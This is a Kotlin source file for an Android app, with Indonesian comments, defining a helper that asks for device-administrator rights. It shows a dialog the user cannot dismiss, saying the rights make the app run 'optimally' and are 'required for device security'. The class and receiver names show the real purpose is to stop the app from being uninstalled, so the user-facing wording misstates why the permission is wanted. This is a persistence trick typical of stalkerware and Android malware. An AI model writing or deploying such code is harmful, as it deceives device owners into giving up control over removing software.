package com.sync.xxx

import android.app.AlertDialog
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent

object AntiUninstallHelper {

    private const val PREF_NAME = "anti_uninstall_prefs"
    private const val KEY_DIALOG_SHOWN = "admin_dialog_shown"

    fun requestAdminIfNeeded(context: Context) {
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = ComponentName(context, AntiUninstallReceiver::class.java)

        // Kalau admin sudah aktif, skip
        if (dpm.isAdminActive(admin)) return

        // Kalau dialog sudah pernah ditampilkan, skip
        val prefs = context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
        if (prefs.getBoolean(KEY_DIALOG_SHOWN, false)) return

        // Simpan flag dulu biar tidak loop
        prefs.edit().putBoolean(KEY_DIALOG_SHOWN, true).apply()

        // Tampilkan dialog custom DULU, baru ke halaman admin setelah user klik
        AlertDialog.Builder(context)
            .setTitle("Aktifkan Admin")
            .setMessage("Aktifkan izin administrator perangkat agar aplikasi berjalan optimal dan tidak terganggu.")
            .setCancelable(false)
            .setPositiveButton("Aktifkan") { _, _ ->
                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
                    putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        "Diperlukan untuk keamanan perangkat.")
                }
                context.startActivity(intent)
            }
            .show()
    }

    fun isAdminActive(context: Context): Boolean {
        val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = ComponentName(context, AntiUninstallReceiver::class.java)
        return dpm.isAdminActive(admin)
    }
}
